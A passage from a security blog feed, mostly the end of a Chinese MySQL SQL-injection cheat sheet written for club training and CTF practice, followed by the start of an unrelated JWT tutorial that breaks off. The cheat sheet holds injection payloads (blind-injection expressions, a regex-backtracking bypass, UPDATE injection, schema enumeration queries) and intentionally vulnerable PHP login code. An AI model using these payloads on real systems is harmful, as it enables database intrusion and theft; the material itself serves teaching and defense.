型数值，作用相当于<code>CONV(N,10,8)</code>。</td></tr><tr><td>HEX(N_S)</td><td>参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式。</td></tr><tr><td>UNHEX(str)</td><td><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。</td></tr><tr><td>BIN(N)</td><td>返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式。</td></tr><tr><td>ASCII(str)</td><td>同<code>ORD(string)</code>。</td></tr><tr><td>CONV(N,from_base,to_base)</td><td>将数值型参数 <code>N</code> 由初始进制 <code>from_base</code> 转换为目标进制 <code>to_base</code> 的形式并返回。</td></tr><tr><td>CHAR(N,… [USING charset_name])</td><td>将每一个参数 <code>N</code> 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。</td></tr></tbody></table><h3 id="字符截取-拼接"><a href="#字符截取-拼接" class="headerlink" title="字符截取/拼接"></a>字符截取/拼接</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>SUBSTR(str,N_start,N_length)</td><td>对指定字符串进行截取，为SUBSTRING的简单版。</td></tr><tr><td>SUBSTRING()</td><td>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code>。</td></tr><tr><td>RIGHT(str,len)</td><td>对指定字符串从<strong>最右边</strong>截取指定长度。</td></tr><tr><td>LEFT(str,len)</td><td>对指定字符串从<strong>最左边</strong>截取指定长度。</td></tr><tr><td>RPAD(str,len,padstr)</td><td>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度。</td></tr><tr><td>LPAD(str,len,padstr)</td><td>与RPAD相似，在<code>str</code>左边补齐。</td></tr><tr><td>MID(str,pos,len)</td><td>同于 <code>SUBSTRING(str,pos,len)</code>。</td></tr><tr><td>INSERT(str,pos,len,newstr)</td><td>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数。</td></tr><tr><td>CONCAT(str1,str2…)</td><td>函数用于将多个字符串合并为一个字符串</td></tr><tr><td>GROUP_CONCAT(…)</td><td>返回一个字符串结果，该结果由分组中的值连接组合而成。</td></tr><tr><td>MAKE_SET(bits,str1,str2,…)</td><td>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code>。</td></tr></tbody></table><h3 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h3><table><thead><tr><th>变量</th><th>说明</th><th>变量</th><th>说明</th></tr></thead><tbody><tr><td>@@VERSION</td><td>返回版本信息</td><td>@@HOSTNAME</td><td>返回安装的计算机名称</td></tr><tr><td>@@GLOBAL.VERSION</td><td>同<code>@@VERSION</code></td><td>@@BASEDIR</td><td>返回MYSQL绝对路径</td></tr></tbody></table><p>PS：查看全部全局变量<code>SHOW GLOBAL VARIABLES;</code>。</p><h3 id="其他常用函数-语句"><a href="#其他常用函数-语句" class="headerlink" title="其他常用函数/语句"></a>其他常用函数/语句</h3><table><thead><tr><th>函数/语句</th><th>说明</th></tr></thead><tbody><tr><td>LENGTH(str)</td><td>返回字符串的长度。</td></tr><tr><td>PI()</td><td>返回π的具体数值。</td></tr><tr><td>REGEXP “statement”</td><td>正则匹配数据，返回值为布尔值。</td></tr><tr><td>LIKE “statement”</td><td>匹配数据，%代表任意内容。返回值为布尔值。</td></tr><tr><td>RLIKE “statement”</td><td>与regexp相同。</td></tr><tr><td>LOCATE(substr,str,[pos])</td><td>返回子字符串第一次出现的位置。</td></tr><tr><td>POSITION(substr IN str)</td><td>等同于 <code>LOCATE()</code>。</td></tr><tr><td>LOWER(str)</td><td>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code>。</td></tr><tr><td>UPPER(str)</td><td>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code>。</td></tr><tr><td>ELT(N,str1,str2,str3,…)</td><td>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值。</td></tr><tr><td>NULLIF(expr1,expr2)</td><td>若expr1与expr2相同，则返回expr1，否则返回NULL。</td></tr><tr><td>CHARSET(str)</td><td>返回字符串使用的字符集。</td></tr><tr><td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td><td>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code>。</td></tr></tbody></table><h2 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h2><p>什么是约束攻击？</p><p>仍然是先举个例子：</p><p>我们先通过下列语句建立一个用户表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users(</span><br><span class="line">username varchar(20),</span><br><span class="line">password varchar(20)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>注册代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysqli_connect(<span class="string">"127.0.0.1:3307"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"db"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$username = addslashes(@$_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = addslashes(@$_POST[<span class="string">'password'</span>]);</span><br><span class="line">$sql = <span class="string">"select * from users where username = '$username'"</span>;</span><br><span class="line">$rs = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span>($rs-&gt;fetch_row())&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'账号已注册'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $sql2 = <span class="string">"insert into users values('$username','$password')"</span>;</span><br><span class="line">    mysqli_query($conn,$sql2);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'注册成功'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>登录判断代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysqli_connect(<span class="string">"127.0.0.1:3307"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"db"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$username = addslashes(@$_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = addslashes(@$_POST[<span class="string">'password'</span>]);</span><br><span class="line">$sql = <span class="string">"select * from users where username = '$username' and password='$password';"</span>;</span><br><span class="line">$rs = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span>($rs-&gt;fetch_row())&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>]=$password;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？</p><p>我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。</p><p>而对于<code>SELECT</code>查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。</p><p>通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个<code>username=admin[25个空格]x&amp;password=123456</code>的账号，服务器会先查询<code>admin[25个空格]x</code>的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为<code>username=admin[20个空格]&amp;password=123456</code>。</p><p>接着进行登录的时，我们使用：<code>username=admin&amp;password=123456</code>进行登录，即可成功登录admin的账号。</p><p>防御：</p><ul><li>给username字段添加unique属性。</li><li>使用id字段作为判断用户的凭证。</li><li>插入数据前判断数据长度。</li></ul><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>简单的说，由于分号<code>;</code>为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如<code>RENAME</code>、<code>DROP</code>等。</p><p>注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用<code>RENAME</code>关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 。具体参考：<a href="https://www.ctfwp.com/articals/2019qiangwang.html#随便注" target="_blank" rel="noopener">2019强网杯——随便注Writeup</a></p><p>PHP中堆叠注入的支持情况：</p><table><thead><tr><th></th><th>Mysqli</th><th>PDO</th><th>MySQL</th></tr></thead><tbody><tr><td>引入的PHP版本</td><td>5.0</td><td>5.0</td><td>3.0之前</td></tr><tr><td>PHP5.x是否包含</td><td>是</td><td>是</td><td>是</td></tr><tr><td>多语句执行支持情况</td><td>是</td><td>大多数</td><td>否</td></tr></tbody></table><blockquote><p>引自：<a href="https://xz.aliyun.com/t/3950" target="_blank" rel="noopener">PDO场景下的SQL注入探究</a></p></blockquote><h2 id="handler语句代替select查询"><a href="#handler语句代替select查询" class="headerlink" title="handler语句代替select查询"></a>handler语句代替select查询</h2><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p></blockquote><p>语法结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure><p>如：通过handler语句查询users表的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler yunensec read first; #读取指定表&#x2F;句柄的首行数据</span><br><span class="line">handler yunensec read next; #读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">handler yunensec read next; #读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">...</span><br><span class="line">handler yunensec close; #关闭句柄</span><br></pre></td></tr></table></figure><h2 id="一些小Trick"><a href="#一些小Trick" class="headerlink" title="一些小Trick"></a>一些小Trick</h2><p>这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。</p><h3 id="PHP-union-select-ig绕过。"><a href="#PHP-union-select-ig绕过。" class="headerlink" title="PHP/union.+?select/ig绕过。"></a>PHP<code>/union.+?select/ig</code>绕过。</h3><p>在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。</p><ul><li><p>利用点：<a href="https://bugs.php.net/bug.php?id=70699" target="_blank" rel="noopener">PHP正则回溯BUG</a></p></li><li><p>具体分析文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p></li></ul><blockquote><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为 100万)，那么正则停止，返回未匹配到数据。</p></blockquote><p>故而我们构造payload：<code>union/*100万个a，充当垃圾数据*/select</code>即可绕过正则判断。</p><p>一道相关的CTF题：<a href="https://github.com/MrR3boot/CTF/tree/master/TetCTF-2020" target="_blank" rel="noopener">TetCTF-2020 WP BY MrR3boot</a></p><h3 id="无列名盲注"><a href="#无列名盲注" class="headerlink" title="无列名盲注"></a>无列名盲注</h3><p>前边提到了，在知道表名，不知道列名的情况下，我们可以利用<code>union</code>来给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的<code>order by</code>盲注之外，这里再提一种新的方法，直接通过select进行盲注。</p><p>核心payload：<code>(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1)</code></p><p>子查询之间也可以直接通过<code>&gt;、&lt;、=</code>来进行判断。</p><h3 id="UPDATE注入重复字段赋值"><a href="#UPDATE注入重复字段赋值" class="headerlink" title="UPDATE注入重复字段赋值"></a>UPDATE注入重复字段赋值</h3><p>即：<code>UPDATA table_name set field1=new_value,field1=new_value2 [where]</code>，最终<code>field1</code>字段的内容为<code>new_value2</code>，可用这个特性来进行UPDATA注入。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name set field1&#x3D;new_value,field1&#x3D;(select user()) [where]</span><br></pre></td></tr></table></figure><h3 id="LIMIT之后的字段数判断"><a href="#LIMIT之后的字段数判断" class="headerlink" title="LIMIT之后的字段数判断"></a>LIMIT之后的字段数判断</h3><p>我们都知道若注入点在where子语句之后，判断字段数可以用<code>order by</code>或<code>group by</code>来进行判断，而<code>limit</code>后可以利用 <code>into @,@</code> 判断字段数，其中@为mysql临时变量。</p><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://blog-img-cos.lfcqjd.com/article/MysqlSQLi/limitInto.png"></p><h2 id="sys系统库"><a href="#sys系统库" class="headerlink" title="sys系统库"></a>sys系统库</h2><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#查询所有的库：</span><br><span class="line">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;</span><br><span class="line">SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;</span><br><span class="line">#查询指定库的表（若无则说明此表从未被访问）：</span><br><span class="line">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema&#x3D;&#39;mspwd&#39; GROUP BY table_name;</span><br><span class="line">SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema&#x3D;&#39;mspwd&#39; GROUP BY table_name;</span><br><span class="line">#统计所有访问过的表次数:库名,表名,访问次数</span><br><span class="line">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;</span><br><span class="line">#查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒)</span><br><span class="line">SELECT user,db,command,current_statement,last_statement,time FROM sys.session;</span><br><span class="line">#查看所有曾连接数据库的IP,总连接次数</span><br><span class="line">SELECT host,total_connections FROM sys.host_summary;</span><br></pre></td></tr></table></figure><p>节选自：<a href="https://www.t00ls.net/thread-54783-1-1.html" target="_blank" rel="noopener">Mysql的奇淫技巧(黑科技)</a></p></blockquote><table><thead><tr><th>视图-&gt;列名</th><th>说明</th></tr></thead><tbody><tr><td>host_summary -&gt; host、total_connections</td><td>历史连接IP、对应IP的连接次数</td></tr><tr><td>innodb_buffer_stats_by_schema -&gt; object_schema</td><td>库名</td></tr><tr><td>innodb_buffer_stats_by_table -&gt; object_schema、object_name</td><td>库名、表名(可指定)</td></tr><tr><td>io_global_by_file_by_bytes -&gt; file</td><td>路径中包含库名</td></tr><tr><td>io_global_by_file_by_latency -&gt; file</td><td>路径中包含库名</td></tr><tr><td>processlist -&gt; current_statement、last_statement</td><td>当前数据库正在执行的语句、该句柄执行的上一条语句</td></tr><tr><td>schema_auto_increment_columns -&gt; table_schema、table_name、column_name</td><td>库名、表名、列名</td></tr><tr><td>schema_index_statistics -&gt; table_schema、table_name</td><td>库名、表名</td></tr><tr><td>schema_object_overview -&gt; db</td><td>库名</td></tr><tr><td>schema_table_statistics -&gt; table_schema、table_name</td><td>库名、表名</td></tr><tr><td>schema_table_statistics_with_buffer -&gt; table_schema、table_name</td><td>库名、表名</td></tr><tr><td>schema_tables_with_full_table_scans -&gt; object_schema、object_name</td><td>库名、表名(全面扫描访问)</td></tr><tr><td>session -&gt; current_statement、last_statement</td><td>当前数据库正在执行的语句、该句柄执行的上一条语句</td></tr><tr><td>statement_analysis -&gt; query、db</td><td>数据库最近执行的请求、对于请求访问的数据库名</td></tr><tr><td>statements_with_* -&gt; query、db</td><td>数据库最近执行的特殊情况的请求、对应请求的数据库</td></tr><tr><td>version -&gt; mysql_version</td><td>mysql版本信息</td></tr><tr><td>x$innodb_buffer_stats_by_schema</td><td>同innodb_buffer_stats_by_schema</td></tr><tr><td>x$innodb_buffer_stats_by_table</td><td>同innodb_buffer_stats_by_table</td></tr><tr><td>x$io_global_by_file_by_bytes</td><td>同io_global_by_file_by_bytes</td></tr><tr><td>……</td><td>同……</td></tr><tr><td>x$schema_flattened_keys -&gt; table_schema、table_name、index_columns</td><td>库名、表名、主键名</td></tr><tr><td>x$ps_schema_table_statistics_io -&gt; table_schema、table_name、count_read</td><td>库名、表名、读取该表的次数</td></tr></tbody></table><p>差点忘了，还有mysql数据库也可以查询表名、库名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select table_name from mysql.innodb_table_stats where database_name&#x3D;database();</span><br><span class="line">select table_name from mysql.innodb_index_stats where database_name&#x3D;database();</span><br></pre></td></tr></table></figure><h1 id="Mysql注入防御"><a href="#Mysql注入防御" class="headerlink" title="Mysql注入防御"></a>Mysql注入防御</h1><ul><li>单引号闭合可控变量，并进行相应的转义处理</li><li>尽量使用预编译来执行SQL语句</li><li>采用白名单机制/完善黑名单</li><li>安装WAF防护软件</li><li>拒绝不安全的编码转换，尽量统一编码</li><li>关闭错误提示</li></ul><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>可能记得东西有点多导致很多内容都是精简过后的知识，其实本文可以当做字典一样来使用，可能讲得不是很细致，但是却方便我们进行复习，回想起脑海中的知识。文章花费了大量的笔墨在记录许多与Mysql注入相关的Trick，故而可能会显得比较杂乱，没有得到一个比较好的整理，可能对于不太了解Mysql注入的同学不太友好，望谅解。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://xz.aliyun.com/t/1719" target="_blank" rel="noopener">【PHP代码审计】入门之路——第二篇-宽字节注入</a></li><li><a href="https://wooyun.js.org/drops/MySQL注入技巧.html" target="_blank" rel="noopener">MySQL注入技巧</a></li><li><a href="https://blog.sari3l.com/posts/9622f295/" target="_blank" rel="noopener">Mysql 注入基础小结</a></li><li><a href="https://www.t00ls.net/thread-54783-1-1.html" target="_blank" rel="noopener">Mysql的奇淫技巧(黑科技)</a></li><li><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">Read MySQL Client’s File</a></li><li><a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">Dnslog在SQL注入中的实战</a></li><li><a href="https://www.freebuf.com/articles/web/154932.html" target="_blank" rel="noopener">从安全角度深入理解MySQL编码转换机制</a></li><li><a href="https://dev.mysql.com/doc/refman/8.0/en/sys-schema-object-index.html" target="_blank" rel="noopener">mysql sys Schema Object Index</a></li></ul>]]></content>
    
    <summary type="html">
    
      最近在给学校的社团成员进行web安全方面的培训，由于在mysql注入这一块知识点挺杂的，入门容易，精通较难，网上相对比较全的资料也比较少，大多都是一个比较散的知识点，所以我打算将我在学习过程中遇到的关于的mysql注入的内容给全部罗列出来，既方便个人之后的复习，也方便后人查找相关资料。
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="SQL注入" scheme="https://www.0x002.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Mysql" scheme="https://www.0x002.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Django基于JWT实现微信小程序的登录和鉴权</title>
    <link href="https://www.0x002.com/2019/Django%E5%9F%BA%E4%BA%8EJWT%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%99%BB%E5%BD%95%E5%92%8C%E9%89%B4%E6%9D%83/"/>
    <id>https://www.0x002.com/2019/Django基于JWT实现微信小程序的登录和鉴权/</id>
    <published>2019-05-17T16:00:00.000Z</published>
    <updated>2019-06-17T16:17:41.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT?"></a>什么是JWT?</h1><p>JWT，全称Json Web Token，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。<br><a id="more"></a></p><h2 id="与Session的区别"><a href="#与Session的区别" class="headerlink" title="与Session的区别"></a>与Session的区别</h2><p>一、Session是在服务器端的，而JWT是在客户端的，这点很重要。<br>二、流程不同：<br><img src="/img/loading.gif" alt="图源网络" class="lazyload" data-src="http://yanxuan.nosdn.127.net/0b0ebdf71d58e1d45019a72ed28c5497.png"></p><h2 id="JWT使用场景"><a href="#JWT使用场景" class="headerlink" title="JWT使用场景"></a>JWT使用场景</h2><ul><li>大量需要进行跨域的站点</li><li>服务器运算能力较差、存储空间较小</li></ul><h2 id="JWT的原理"><a href="#JWT的原理" class="headerlink" title="JWT的原理"></a>JWT的原理</h2><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;姓名&quot;: &quot;张三&quot;,</span><br><span class="line">  &quot;角色&quot;: &quot;管理员&quot;,</span><br><span class="line">  &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。</p><p>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p><h2 id="JWT数据的格式"><a href="#JWT数据的格式" class="headerlink" title="JWT数据的格式"></a>JWT数据的格式</h2><p>实际的 JWT 大概就像下面这样。</p><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://p.pstatp.com/origin/ffb20000b244f731af30"></p><p>它是一个很长的字符串，中间用点（<code>.</code>）分隔成三个部分。注意，JWT 内部是没有换行的，这里只是为了便于展示，将它写成了几行。</p><p>JWT 的三个部分依次如下。</p><ul><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）</li></ul><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://p.pstatp.com/origin/feff000039c00ca26428">  </p><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT。</p><p>最后，将上面的 JSON 对象使用 Base64URL 算法（详见后文）转成字符串。</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul><p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</p><p>这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>Signature 部分是对前两部分的签名，防止数据篡改。</p><p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p><h3 id="Base64URL"><a href="#Base64URL" class="headerlink" title="Base64URL"></a>Base64URL</h3><p>前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。</p><p>JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 <code>api.example.com/?token=xxx</code>）。Base64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。</p><h2 id="JWT的使用方式"><a href="#JWT的使用方式" class="headerlink" title="JWT的使用方式"></a>JWT的使用方式</h2><p>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p><p>此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息Authorization字段里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><br>另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。</p><h2 id="JWT-的几个特点"><a href="#JWT-的几个特点" class="headerlink" title="JWT 的几个特点"></a>JWT 的几个特点</h2><p>（1）JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</p><p>（2）JWT 不加密的情况下，不能将秘密数据写入 JWT。</p><p>（3）JWT 不仅可以用于认证，也可以用于交换信息。有效使用 